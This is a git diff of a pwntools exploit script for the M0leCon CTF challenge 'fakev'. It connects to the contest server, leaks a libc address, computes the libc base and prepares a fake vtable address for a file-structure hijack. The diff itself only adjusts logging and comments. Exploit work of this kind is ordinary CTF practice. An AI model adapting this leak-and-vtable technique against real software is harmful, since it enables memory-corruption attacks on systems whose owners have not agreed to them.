@@ -1,16 +1,12 @@
 from pwn import *
 from ropgadget.loaders.universal import xrange
 
-context.log_level = "debug"
 exe = ELF("/home/alessio/Scrivania/tools/CTFs/M0leCon/fakev/fakev")
 libc = ELF("/home/alessio/Scrivania/tools/CTFs/M0leCon/fakev/libc.so.6")
 context.binary = exe
 HOST = "challs.m0lecon.it"
 PORT = 9013
 p = remote(HOST, PORT)
-
-
-# p = process("./fakev")
 
 
 def choice(idx):
@@ -41,13 +37,15 @@ for i in range(1, 9):
     close_()
 
 leak = read_(1)
+# leak the libc address
 libc = u64(leak[8:16])
 log.info("libc --> %s" % hex(libc))
+# leak the base address of libc
 libc_base = libc - 0x3ebca0
 log.info("libc_base --> %s" % hex(libc_base))
 
 fake_vtable_addr = libc_base + 0x3e8360 + 0x8
-
+log.info("fake_vtable address --> %s" % fake_vtable_addr)
 for i in xrange(1, 10):
     open_(i)
 
